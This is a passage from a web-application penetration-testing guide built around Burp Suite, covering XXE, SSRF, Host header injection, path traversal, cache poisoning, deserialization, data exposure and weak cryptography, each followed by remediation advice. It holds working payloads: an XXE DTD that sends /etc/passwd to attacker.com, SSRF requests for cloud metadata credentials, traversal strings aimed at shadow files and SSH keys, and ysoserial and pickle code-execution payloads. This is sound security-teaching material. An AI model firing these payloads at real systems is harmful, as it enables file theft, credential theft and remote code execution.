   ✓ Good:
   Access-Control-Allow-Origin: https://trusted.example.com
   Access-Control-Allow-Credentials: true
   ```

2. **Whitelist specific origins:**
   ```javascript
   const allowedOrigins = [
     'https://example.com',
     'https://app.example.com'
   ];
   
   if (allowedOrigins.includes(req.headers.origin)) {
     res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
   }
   ```

3. **Use explicit headers:**
   ```
   Access-Control-Allow-Methods: POST, GET
   Access-Control-Allow-Headers: Content-Type, Authorization
   ```

---

## Phase 12: XXE (XML External Entity) Injection

**Goal:** Identify XML External Entity vulnerabilities that allow reading files, SSRF, and DoS attacks.

### 12.1 Identify XML Input Points

**Find XML processing:**

1. In Burp, look for:
   - Content-Type: `application/xml`
   - Content-Type: `application/soap+xml`
   - File uploads: `.xml`, `.xsd`, `.wsdl`
   - Parameters that accept XML data

2. Common XML endpoints:
   - `/api/upload` (document parsing)
   - `/soap/` (SOAP services)
   - `/xmlrpc/` (XML-RPC)
   - File import features

### 12.2 Basic XXE Test

**Send simple XXE payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**In Burp Repeater:**

```
POST /api/upload HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <name>&xxe;</name>
</user>
```

**Vulnerable response:**
```
<response>
  <name>root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...</name>
</response>
```

### 12.3 XXE via External Entity

**File read XXE:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

**Common file paths to try:**

| Path | System |
|------|--------|
| `/etc/passwd` | Linux |
| `/etc/shadow` | Linux (if readable) |
| `/root/.ssh/id_rsa` | SSH keys |
| `C:\windows\win.ini` | Windows |
| `C:\windows\system32\drivers\etc\hosts` | Windows |
| `/proc/self/environ` | Environment variables |

### 12.4 XXE with External DTD

**If output is not directly shown:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfiltrate;</foo>
```

**Attacker-hosted evil.dtd:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfiltrate;
```

### 12.5 XXE DoS (Billion Laughs Attack)

**Test for XXE without crash protection:**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**If server crashes or hangs:**
```
❌ FINDING: XXE DoS Vulnerability
```

### 12.6 XXE in SOAP

**SOAP services often process XML:**

```
POST /soap/ HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap-envelope/">
  <soap:Body>
    <loginRequest>
      <username>&xxe;</username>
      <password>test</password>
    </loginRequest>
  </soap:Body>
</soap:Envelope>
```

### 12.7 Blind XXE Detection

**If error-based XXE doesn't work, use time-based:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  <time>&xxe;</time>
</foo>
```

If no error shown, use **Burp Collaborator** for out-of-band testing:

1. Burp → Collaborator → Copy collaborator payload
2. Send XXE with callback:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % dtd SYSTEM "http://YOUR_COLLABORATOR_URL/evil.dtd">
   %dtd;
   ```

3. Check Collaborator for DNS/HTTP requests (confirms XXE)

### 12.8 XXE in File Uploads

**If app accepts XML file uploads:**

1. Create XML file:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE items [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <items>
     <item>&xxe;</item>
   </items>
   ```

2. Upload via Burp:
   - Proxy → Intercept form submission
   - Change file content to XXE payload
   - Forward request

### 12.9 Remediation

**Disable XXE attacks:**

1. **Disable external entities (Python):**
   ```python
   import xml.etree.ElementTree as ET
   parser = ET.XMLParser()
   parser.entity = {}  # Disable entities
   tree = ET.parse(xmlfile, parser)
   ```

2. **Disable external entities (Java):**
   ```java
   SAXParserFactory spf = SAXParserFactory.newInstance();
   spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

3. **Use library with safe defaults** (e.g., defusedxml in Python)

---

## Phase 13: SSRF (Server-Side Request Forgery)

**Goal:** Identify Server-Side Request Forgery vulnerabilities allowing attackers to make unauthorized requests from the server.

### 13.1 Identify SSRF Entry Points

**Common SSRF vulnerable features:**

- URL fetching: `/fetch?url=`, `/proxy?url=`
- File uploads from URL: `/upload?file_url=`
- Document parsers: `/parse?url=`
- Web screenshots: `/screenshot?target=`
- API integrations: `/webhook?callback=`
- Image proxies: `/image?src=`
- PDF generation from URL: `/generate-pdf?source=`

### 13.2 Basic SSRF Detection

**Test with internal IP:**

```
GET /fetch?url=http://127.0.0.1:8080 HTTP/1.1
GET /fetch?url=http://localhost/admin HTTP/1.1
GET /fetch?url=http://192.168.1.1 HTTP/1.1
GET /fetch?url=http://169.254.169.254 (AWS metadata)
```

**Vulnerable response patterns:**

```
Status 200 with internal service response
Error page revealing internal service name
Response time longer than expected (timeout connecting)
```

### 13.3 SSRF to Local File Access

**Test file:// protocol:**

```
GET /fetch?url=file:///etc/passwd HTTP/1.1
GET /fetch?url=file:///c:/windows/win.ini HTTP/1.1
```

**If readable:**
```
❌ FINDING: SSRF with Local File Access
```

### 13.4 SSRF to Cloud Metadata

**AWS metadata endpoint (common target):**

```
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
GET /fetch?url=http://169.254.169.254/latest/user-data HTTP/1.1
```

**If accessible:**
```
❌ FINDING: SSRF to AWS Metadata (credential exposure)
Leaked credentials can access entire AWS account
```

**GCP metadata:**
```
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity HTTP/1.1
```

**Azure metadata:**
```
GET /fetch?url=http://169.254.169.254/metadata/instance HTTP/1.1
```

### 13.5 SSRF to Port Scanning

**Scan internal network:**

1. Send to Intruder
2. Highlight port number:
   ```
   GET /fetch?url=http://192.168.1.1:8080 HTTP/1.1
   ```

3. Payloads:
   ```
   22, 80, 443, 3306, 5432, 6379, 9200, 27017, 8080, 8443
   ```

4. Run attack
5. Compare response times/status codes

**Quick ports = open, slow/timeout = closed**

### 13.6 SSRF with Protocol Smuggling

**Bypass filters with protocol tricks:**

```
GET /fetch?url=http://127.0.0.1@attacker.com HTTP/1.1
GET /fetch?url=http://127.0.0.1#attacker.com HTTP/1.1
GET /fetch?url=http://localhost%3a80 HTTP/1.1
GET /fetch?url=http://[::1]:80 HTTP/1.1
GET /fetch?url=http://0000000000001 HTTP/1.1
GET /fetch?url=http://0x7f.0x0.0x0.0x1 HTTP/1.1
```

### 13.7 SSRF to Blind SSRF via Burp Collaborator

**If no output returned:**

1. Burp → Collaborator → Copy payload
2. Send SSRF request with callback:
   ```
   GET /fetch?url=http://YOUR_COLLABORATOR_URL HTTP/1.1
   ```

3. Check Collaborator for HTTP request
4. Confirms SSRF even without visible output

### 13.8 SSRF in POST Data

**Test with JSON/form data:**

```
POST /api/webhook HTTP/1.1
Content-Type: application/json

{"callback_url": "http://127.0.0.1:8080/admin"}
```

```
POST /api/webhook HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback_url=http://169.254.169.254/latest/meta-data/
```

### 13.9 Remediation

**Prevent SSRF attacks:**

1. **Whitelist allowed protocols/domains:**
   ```python
   from urllib.parse import urlparse
   
   allowed_domains = ['api.example.com', 'cdn.example.com']
   url = request.args.get('url')
   parsed = urlparse(url)
   
   if parsed.netloc not in allowed_domains:
       return "Domain not allowed", 403
   ```

2. **Block internal IP ranges:**
   ```python
   import ipaddress
   
   ip = ipaddress.ip_address(parsed.hostname)
   if ip.is_private or ip.is_loopback:
       return "Internal IP not allowed", 403
   ```

3. **Disable file:// protocol:**
   ```python
   if parsed.scheme == 'file':
       return "File protocol not allowed", 403
   ```

4. **Use allowlist, not blacklist**

---

## Phase 14: Host Header Injection

**Goal:** Identify Host header injection vulnerabilities that enable cache poisoning, password reset poisoning, and other attacks.

### 14.1 Understand Host Header Attacks

**The Host header specifies the destination domain:**

```
GET / HTTP/1.1
Host: target.com
```

**Attack:** Inject malicious Host header:

```
GET / HTTP/1.1
Host: attacker.com
```

**Vulnerable apps may:**
- Use Host header to generate URLs (password reset links)
- Forward Host header to backend
- Generate absolute URLs with Host value

### 14.2 Test for Host Header Injection

**In Burp Repeater:**

```
GET / HTTP/1.1
Host: attacker.com
```

**Check response for:**
- Links pointing to `attacker.com`
- Cookies set for `attacker.com`
- Redirects to `attacker.com`
- Error messages showing `attacker.com`

### 14.3 Password Reset Link Injection

**Common SSRF attack vector:**

1. Click "Forgot Password"
2. Intercept in Burp
3. Change Host header:
   ```
   POST /forgot-password HTTP/1.1
   Host: attacker.com
   
   email=victim@example.com
   ```

4. Check email for reset link:
   - `https://attacker.com/reset?token=...` (vulnerable!)
   - Attacker now controls reset link

**Attack flow:**
1. Attacker sends victim password reset request
2. Reset email contains attacker-controlled domain
3. Victim clicks link (on attacker server)
4. Attacker captures reset token
5. Attacker resets victim password

### 14.4 Cache Poisoning via Host Header

**If responses are cached (CDN):**

1. Send request with malicious Host:
   ```
   GET / HTTP/1.1
   Host: attacker.com
   ```

2. Response cached with attacker domain in it:
   ```
   Set-Cookie: domain=attacker.com
   Link: <https://attacker.com/resource>
   ```

3. Legitimate users get cached poisoned response

### 14.5 Host Header Bypass Techniques

**If simple injection doesn't work:**

```
GET / HTTP/1.1
Host: target.com:attacker.com
Host: target.com@attacker.com
Host: target.com#attacker.com
Host: target.com%23attacker.com
Host: target.com%40attacker.com
X-Forwarded-Host: attacker.com
X-Original-Host: attacker.com
X-Host: attacker.com
```

### 14.6 Test with Burp Intruder

**Automate Host header testing:**

1. Send request to Intruder
2. Highlight Host value: `target.com`
3. Payloads:
   ```
   attacker.com
   target.com.attacker.com
   target.com@attacker.com
   target.com#attacker.com
   attacker.com:80
   attacker.com:443
   ```

4. Run attack
5. Compare responses for differences

### 14.7 Identify Vulnerable Response Patterns

**Look for:**

```html
<!-- Vulnerable: URL constructed from Host header -->
<a href="https://${request.header['Host']}/reset">Reset</a>

<!-- Vulnerable: Redirect uses Host header -->
Location: https://${request.header['Host']}/dashboard

<!-- Vulnerable: Cookie domain from Host -->
Set-Cookie: session=xxx; Domain=${request.header['Host']}
```

### 14.8 Remediation

**Fix Host header injection:**

1. **Validate Host header:**
   ```python
   allowed_hosts = ['example.com', 'www.example.com', 'api.example.com']
   host = request.headers.get('Host').split(':')[0]
   
   if host not in allowed_hosts:
       return "Invalid Host", 400
   ```

2. **Use config-driven URLs:**
   ```python
   CANONICAL_URL = "https://example.com"
   # Never construct URLs from request headers
   reset_link = f"{CANONICAL_URL}/reset?token={token}"
   ```

3. **Don't rely on Host header:**
   ```python
   # Bad
   domain = request.headers.get('Host')
   
   # Good
   domain = app.config['CANONICAL_DOMAIN']
   ```

4. **Use absolute URLs in templates:**
   ```
   <!-- Bad -->
   <a href="/reset">Reset Password</a>
   
   <!-- Good (with config-driven domain) -->
   <a href="https://example.com/reset">Reset Password</a>
   ```

---

## Phase 15: Path Traversal / Directory Traversal

**Goal:** Identify path traversal vulnerabilities allowing access to files outside the intended directory.

### 15.1 Identify Path Traversal Entry Points

**Look for file-related parameters:**

- `/download?file=document.pdf`
- `/view?path=/uploads/image.jpg`
- `/serve?filename=report.docx`
- `/static?file=style.css`
- `/include?page=header.php`
- `/load?template=email.html`

### 15.2 Basic Path Traversal Test

**Use ../ sequences to escape directories:**

```
GET /download?file=document.pdf
→ Server serves: /uploads/document.pdf

GET /download?file=../../../etc/passwd
→ Server serves: /etc/passwd (vulnerable!)
```

**Common traversal patterns:**

```
../
..\\
../ (multiple)
....//
..%2f
..%5c
%2e%2e%2f
..%252f
....%2f
```

### 15.3 Windows Path Traversal

**Test Windows paths:**

```
GET /view?file=..\..\windows\win.ini
GET /view?file=..%5c..%5cwindows%5cwin.ini
GET /view?file=C:\windows\system32\config\sam
```

### 15.4 Null Byte Injection

**In some legacy systems:**

```
GET /download?file=../../../etc/passwd%00.jpg
```

Server may strip `.jpg` and serve `/etc/passwd`.

### 15.5 Double Encoding Bypass

**If single encoding is filtered:**

```
GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

First decode: `..%2f..%2fetc%2fpasswd`  
Second decode: `../../../etc/passwd`

### 15.6 Case Sensitivity Bypass

**On case-insensitive systems:**

```
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd
GET /download?file=..%2f..%2f..%2fetc%2fpasswd (if %2F filtered, try %2f)
```

### 15.7 Burp Intruder Path Traversal Testing

**Automate traversal testing:**

1. Send download request to Intruder
2. Highlight file parameter: `document.pdf`
3. Payloads:
   ```
   ../../../etc/passwd
   ..%2f..%2f..%2fetc%2fpasswd
   ....//....//....//etc/passwd
   ..\..\..\..\windows\system32\config\sam
   ```

4. Run attack
5. Check response sizes (larger = file found)
6. Filter for 200 status codes

### 15.8 Identify Blocked Characters/Sequences

**If ../ is blocked, try alternatives:**

```
..\ (Windows separator)
.../ (three dots)
..../ (four dots)
..%2f
..%5c
..%252f
%2e%2e%2f
%252e%252e%252f
```

### 15.9 Test with Specific Files

**Files to attempt:**

| Path | System | Common Locations |
|------|--------|------------------|
| `/etc/passwd` | Linux | Readable |
| `/etc/shadow` | Linux | Needs root |
| `/root/.ssh/id_rsa` | SSH keys | Needs root |
| `C:\windows\win.ini` | Windows | Often readable |
| `C:\windows\system32\drivers\etc\hosts` | Windows | Often readable |
| `/proc/self/environ` | Linux | Process env vars |
| `web.config` | Windows IIS | App config |
| `web.xml` | Java | App config |

### 15.10 Remediation

**Prevent path traversal:**

1. **Use allowlist of files:**
   ```python
   allowed_files = ['document.pdf', 'report.docx', 'invoice.pdf']
   requested_file = request.args.get('file')
   
   if requested_file not in allowed_files:
       return "File not found", 404
   ```

2. **Canonicalize paths:**
   ```python
   import os
   base_dir = '/uploads'
   requested_file = request.args.get('file')
   full_path = os.path.normpath(os.path.join(base_dir, requested_file))
   
   # Ensure path is still within base_dir
   if not full_path.startswith(base_dir):
       return "File not found", 404
   ```

3. **Use IDs instead of filenames:**
   ```python
   # Bad
   file = request.args.get('file')  # Could be ../../../etc/passwd
   
   # Good
   file_id = request.args.get('id')  # Just a number
   file = database.get_file_by_id(file_id)
   ```

4. **Strip traversal sequences:**
   ```python
   filename = filename.replace('..', '')
   filename = filename.replace('\\', '')
   ```
   (Note: This is weak, prefer whitelisting)

---

## Phase 16: Cache Poisoning

**Goal:** Identify cache poisoning vulnerabilities where attacker input gets cached and served to other users.

### 16.1 Understand Caching Mechanisms

**Cache layers:**
- Browser cache
- CDN cache (Cloudflare, Akamai)
- Proxy cache
- Application cache

**Cache key usually includes:**
- URL path
- Query parameters (sometimes)
- **Host header (sometimes)**
- **Accept header (sometimes)**
- **User-Agent header (sometimes)**

### 16.2 Identify Cached Responses

**In Burp Proxy → HTTP history:**

1. Look for cache headers:
   ```
   Cache-Control: max-age=3600
   Cache-Control: public
   Set-Cookie: session=...
   Expires: Thu, 19 Nov 2026 08:52:00 GMT
   ETag: "123456"
   Last-Modified: Mon, 04 Apr 2026 12:00:00 GMT
   ```

2. Responses with caching enabled = vulnerable to poisoning

### 16.3 Test Basic Cache Poisoning

**Send request with injected header:**

```
GET /api/user/profile HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

**Check response:**
- Does response include your header value?
- Is response cached for other users?

**If yes:**
```
❌ FINDING: Cache Poisoning via X-Forwarded-Host
```

### 16.4 Cache Poisoning via Host Header

**Test Host header reflection in cached response:**

```
GET / HTTP/1.1
Host: attacker.com
```

**If response shows attacker domain:**
```html
<link rel="stylesheet" href="https://attacker.com/style.css">
<script src="https://attacker.com/app.js"></script>
```

**Then other users will load malicious scripts from attacker's server.**

### 16.5 Cache Poisoning via User-Agent

**Similar to Host header:**

```
GET / HTTP/1.1
User-Agent: Mozilla/5.0 <script>alert('XSS')</script>
```

If cached response includes User-Agent without escaping:
```
❌ FINDING: Cache Poisoning via User-Agent
```

### 16.6 Cache Poisoning via Accept Header

**Some apps render based on Accept header:**

```
GET /api/data HTTP/1.1
Accept: application/json;q=0.9, application/xml;q=0.1, */*/q=0.1
```

If XML response is cached but JSON requested:
```
❌ FINDING: Response Type Confusion (cache poisoning)
```

### 16.7 Keyed Response Poisoning

**Headers NOT in cache key but in response:**

Test headers that might not be cached:
```
X-Forwarded-For: attacker.com
X-Real-IP: attacker.com
X-Forwarded-Proto: https
X-Forwarded-Host: attacker.com
X-Original-Host: attacker.com
```

If response includes your injected value, check if cached for others.

### 16.8 Test Cache TTL

**Identify cache duration:**

1. Send request, note response
2. Wait for TTL (check Cache-Control max-age)
3. Send same request again
4. Does response come from cache or regenerated?

**If long TTL with user-controlled input:**
```
❌ FINDING: Long-lived cached poisoned response
```

### 16.9 Cache Deception Attack

**Attacker poisons cache with sensitive data:**

1. Attacker sends: `GET /admin/settings.txt HTTP/1.1`
2. Server responds with admin settings
3. Response gets cached (if Cache-Control allows)
4. Attacker accesses `/admin/settings.txt` later
5. Gets cached admin response

**Test:**

```
GET /admin/panel HTTP/1.1
→ Normally requires auth (403)

GET /admin/panel.css HTTP/1.1
→ Path not in cache key, might return cached admin page
```

### 16.10 Remediation

**Prevent cache poisoning:**

1. **Whitelist cache keys:**
   ```
   Cache-Control: private, max-age=3600
   Vary: Accept-Encoding
   ```

2. **Don't include user-controlled data in cached responses:**
   ```python
   # Bad
   host = request.headers.get('Host')
   html = f"<base href='https://{host}'>"
   return html  # Cached with attacker domain
   
   # Good
   html = "<base href='https://example.com'>"
   return html  # Static, safe to cache
   ```

3. **Explicitly specify Vary header:**
   ```
   Vary: Host, Accept-Language, Accept-Encoding
   ```

4. **Set appropriate Cache-Control:**
   ```
   Cache-Control: private (for user-specific data)
   Cache-Control: public, max-age=3600 (for static content)
   ```

---

## Phase 17: Insecure Deserialization

**Goal:** Identify insecure deserialization vulnerabilities that can lead to arbitrary code execution.

### 17.1 Identify Serialization Entry Points

**Look for serialized data:**

- Cookies with serialized objects (PHP, Java)
- Request parameters with base64 encoded serialized data
- Session files
- API responses with serialized payloads
- Message queues
- Cache data

**Signs of serialization:**

```
# PHP serialization
O:8:"UserData":3:{s:4:"name";s:4:"John";}

# Java serialization (base64)
rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIUV...

# Python pickle (base64)
gASVHgAAAAAAAHg3AHEAKFgFAAAAY...
```

### 17.2 Test PHP Serialization

**Identify PHP serialized objects:**

1. In Burp, look for cookie or parameter with pattern:
   ```
   O:8:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
   ```

2. Attempt to unserialize custom object:
   ```
   O:8:"Exploit":1:{s:8:"__wakeup";"system('id');"}
   ```

**If app has magic methods, might execute arbitrary code:**

```php
class Exploit {
    public $command;
    
    public function __wakeup() {
        system($this->command);  // Vulnerable!
    }
}
```

### 17.3 Test Java Deserialization

**Java serialized objects often start with:** `aced0005`

1. Intercept request with serialized Java object
2. Look for patterns like:
   ```
   rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...
   ```

3. Use **ysoserial** tool to generate gadget chain:
   ```bash
   java -jar ysoserial.jar CommonsCollections3 'touch /tmp/pwned' | base64
   ```

4. Send generated payload in place of serialized data
5. If file is created:
   ```
   ❌ FINDING: Arbitrary Code Execution via Deserialization
   ```

### 17.4 Identify Dangerous Gadgets

**Known dangerous deserialization chains:**

| Library | Risk |
|---------|------|
| Commons Collections | High (RCE) |
| Spring Framework | High (RCE) |
| ROME | High (RCE) |
| XStream | High (RCE) |
| JNDI (Java Naming) | Critical (RCE) |

### 17.5 Test with Burp Collaborator

**Out-of-band deserialization testing:**

1. Burp → Collaborator → Copy payload
2. Create ysoserial payload that calls Collaborator:
   ```bash
   java -jar ysoserial.jar CommonsCollections3 \
     'curl http://YOUR_COLLABORATOR_URL' | base64
   ```

3. Send payload in deserialization parameter
4. Check Collaborator for HTTP callback
5. Confirms RCE even without visible output

### 17.6 Python Pickle Exploitation

**If app uses Python pickle:**

```python
# Vulnerable code
import pickle
data = pickle.loads(request.data)

# Attacker creates payload
import subprocess
import pickle
import base64

class RCE(object):
    def __reduce__(self):
        return (subprocess.Popen, (['touch', '/tmp/pwned'],))

payload = base64.b64encode(pickle.dumps(RCE()))
```

**Send payload, check if /tmp/pwned is created.**

### 17.7 Test Serialization Filters

**Modern frameworks may filter dangerous classes:**

Test if filters exist:
```
# Try to deserialize HashMap (benign)
O:7:"HashMap":2:{...}  → If accepted, filters may be weak

# Try to deserialize ProcessBuilder (dangerous)
O:13:"ProcessBuilder":1:{...}  → If rejected, filters active
```

### 17.8 Remediation

**Fix insecure deserialization:**

1. **Don't deserialize untrusted data:**
   ```python
   # Bad
   obj = pickle.loads(user_input)
   
   # Good
   obj = json.loads(user_input)  # JSON is safer
   ```

2. **Use signed serialization:**
   ```python
   from itsdangerous import Serializer
   s = Serializer('secret-key')
   obj = s.loads(signed_data)  # Only deserialize if signature valid
   ```

3. **Whitelist classes:**
   ```python
   import pickle
   
   class SafeUnpickler(pickle.Unpickler):
       def find_class(self, module, name):
           if module not in ['builtins', 'app']:
               raise ValueError(f"Unpickling {module}.{name} not allowed")
           return super().find_class(module, name)
   ```

4. **Use Java deserialization filters:**
   ```java
   ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
     "java.util.*;!*"
   );
   ObjectInputStream ois = new ObjectInputStream(stream);
   ObjectInputFilter.Config.setObjectInputFilter(ois, filter);
   ```

---

## Phase 18: Sensitive Data Exposure

**Goal:** Identify exposure of sensitive data in responses, logs, source code, and unencrypted communications.

### 18.1 Identify Sensitive Data Exposure Points

**Common exposure vectors:**

- Personally Identifiable Information (PII): Names, emails, phone numbers, addresses
- Financial data: Credit card numbers, bank accounts
- Credentials: Passwords, API keys, tokens
- Healthcare data: Medical records, diagnoses
- Authentication tokens: Session IDs, JWTs, OAuth tokens
- Source code: Comments, debug info, configuration
- Error messages: Stack traces, database info

### 18.2 Test API Response Data

**In Burp Proxy → HTTP history:**

1. Review all API responses for sensitive data
2. Check for:
   - Full credit card numbers (should be masked: `****1234`)
   - Password fields in responses
   - Full SSN (should be masked: `***-**-1234`)
   - Unnecessary personal details

**Example vulnerable response:**

```json
{
  "user": {
    "id": 123,
    "name": "John Smith",
    "email": "john@example.com",
    "phone": "555-1234",
    "ssn": "123-45-6789",  // Exposure!
    "credit_card": "4532123456789123"  // Exposure!
  }
}
```

### 18.3 Test for Oversharing in Responses

**API might return more data than needed:**

```
GET /api/user/123 → Returns: {"id": 123, "name": ..., "admin": true, "salary": 150000}
```

**Test by requesting others' data:**

```
GET /api/user/456 → Do you get admin status and salary for another user?
```

### 18.4 Check Source Code Exposure

**In Burp, review all JavaScript files:**

1. Target → Site map → Filter for `.js` files
2. Right-click → Send to Repeater → View source
3. Look for:
   - API endpoints: `fetch('/api/secret/data')`
   - Keys: `API_KEY = "sk_live_..."`
   - Secrets: `SECRET_TOKEN = "..."`
   - Internal IPs: `backend: "http://10.0.0.5:3000"`

### 18.5 Test Git Repository Exposure

**Some apps expose .git folder:**

```
GET /.git/config
GET /.git/HEAD
```

If accessible:
```
❌ FINDING: Exposed Git Repository
Can extract source code and secrets
```

### 18.6 Check Error Messages

**In Burp, trigger errors:**

1. Invalid input: `?id=invalid`
2. SQL error: `?id=1' OR '1'='1`
3. File not found: `/nonexistent`

**Vulnerable error messages expose:**

```
SQL Error: SELECT * FROM users WHERE id = 'invalid'
  MySQL Error: Syntax error near 'invalid'
  
Stack trace:
  at DbConnection.query(db.js:45)
  at UserController.getUser(user.js:123)
  /var/www/html/app/controllers/user.js
  
Exception: File not found: /var/www/data/invoice.pdf
```

### 18.7 Test for Unencrypted Sensitive Data

**Check protocol used for sensitive operations:**

1. Login request: Should be HTTPS
2. Password change: Should be HTTPS
3. Credit card entry: Should be HTTPS

**Test:**

```
POST /login HTTP (not HTTPS)
username=admin&password=secret
```

Credentials over HTTP = Vulnerability

### 18.8 Check Logging for Sensitive Data

**If you can access logs:**

1. Application logs: `/var/log/app/app.log`
2. Web server logs: `/var/log/apache2/access.log`
3. Burp proxy logs

**Look for:**
- Passwords logged
- API keys logged
- Full credit cards logged
- PII logged

### 18.9 Test Autocomplete/History

**Browser might cache sensitive data:**

```html
<!-- Bad: Password field with autocomplete -->
<input type="password" name="password" autocomplete="on">

<!-- Good: Disable autocomplete -->
<input type="password" name="password" autocomplete="off">
```

Test by typing in form, checking browser history.

### 18.10 Remediation

**Prevent sensitive data exposure:**

1. **Mask sensitive data in responses:**
   ```python
   def format_card(card_number):
       return f"****{card_number[-4:]}"
   
   def format_ssn(ssn):
       return f"***-**-{ssn[-4:]}"
   ```

2. **Don't log sensitive data:**
   ```python
   # Bad
   logger.info(f"User login: {username}:{password}")
   
   # Good
   logger.info(f"User login: {username}")
   ```

3. **Encrypt sensitive data at rest:**
   ```python
   from cryptography.fernet import Fernet
   f = Fernet(key)
   encrypted = f.encrypt(credit_card.encode())
   ```

4. **Use HTTPS everywhere:**
   ```
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   ```

5. **Remove debug info in production:**
   ```python
   # Bad (production)
   DEBUG = True
   
   # Good
   DEBUG = False
   ```

---

## Phase 19: Weak Cryptography

**Goal:** Identify weak encryption, hashing, and cryptographic implementations.

### 19.1 Analyze Hashing Algorithms

**Check password hashing in responses/requests:**

1. Capture password storage/reset requests
2. Look for hashes in responses

**Weak hashing (vulnerable):**
```
MD5: 5d41402abc4b2a76b9719d911017c592
SHA1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
```

**Strong hashing (better):**
```
bcrypt: $2b$12$0R8w1a8KzD4ZjNEVHQL2i.8VzVHVFMRMa8O.ZWPvVzxBKp5xGw6tS
scrypt: $7$C6..../....c2V60fBhNJiK.c6H7yVFk66IjnRSoVzWW
argon2: $argon2id$v=19$m=65536$3q
```

### 19.2 Identify Encryption Methods

**Look for encryption in data transmission:**

1. Check cookies for encryption
2. Check API responses for encrypted fields
3. Look for `Cipher` or encryption headers

**Weak encryption (vulnerable):**
```
DES: Too short (56-bit)
RC4: Broken
MD5 HMAC: Weak
```

**Strong encryption (better):**
```
AES-256-GCM
ChaCha20-Poly1305
HMAC-SHA256
```

### 19.3 Test for Hardcoded Encryption Keys

**Check JavaScript source code for keys:**

```javascript
// Bad
const encryptionKey = "super-secret-key-123";
const iv = "1234567890abcdef";

// Attacker can extract and decrypt data
```

**In Burp:**
1. Target → Site map → .js files
2. View source
3. Search for: `key`, `secret`, `password`, `IV`

### 19.4 Test JWT Signing Algorithm

**If app uses JWT:**

1. Capture JWT token
2. Decode at jwt.io
3. Check algorithm:
   ```
   Header: {"alg": "HS256"}
   ```

**Weak algorithms:**
- `"alg": "none"` (no signature)
- `"alg": "HS256"` with weak secret

### 19.5 Test Algorithm Confusion Attack

**Try to bypass JWT signature:**

1. Original JWT uses RS256 (asymmetric):
   ```
   {"alg": "RS256", "typ": "JWT"}
   ```

2. Change to HS256 (symmetric):
   ```
   {"alg": "HS256", "typ": "JWT"}
   ```

3. Re-sign with public key (which might be available):
   ```bash
   # Server publishes public key, attacker uses it as HMAC secret
   new_token = HMAC_SHA256(header.payload, public_key)
   ```

4. If server accepts, it's vulnerable.

### 19.6 Test for Predictable Random Values

**Cryptographic randomness is critical:**

```python
# Bad: Uses time-based seed
import random
random.seed(time.time())
token = random.randint(1000000, 9999999)

# Attacker can predict tokens based on time
```

**In Burp Intruder:**
- Collect multiple session tokens
- Analyze for patterns
- If sequential or predictable → Vulnerability

### 19.7 Test SSL/TLS Configuration

**Using Burp or external tool:**

```bash
openssl s_client -connect target.com:443 -tls1_2
```

**Look for:**
- TLS version: Should be 1.2+
- Cipher strength: Should be 256-bit+
- Certificate validity

**Vulnerable TLS:**
- TLS 1.0, 1.1
- Null or weak ciphers
- Expired certificates

### 19.8 Test Key Exchange Weakness

**Some protocols have weak key exchange:**

```
DH_DSS: Weak
ECDH_ECDSA: Strong
DHE_RSA: Strong (if 2048+ bits)
ECDHE_RSA: Strong
```

Check cipher list:
```bash
openssl s_client -connect target.com:443 -tls1_2 | grep -i cipher
```

### 19.9 Remediation

**Fix weak cryptography:**

1. **Use strong hashing for passwords:**
   ```python
   import bcrypt
   hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
   ```

2. **Use strong encryption:**
   ```python
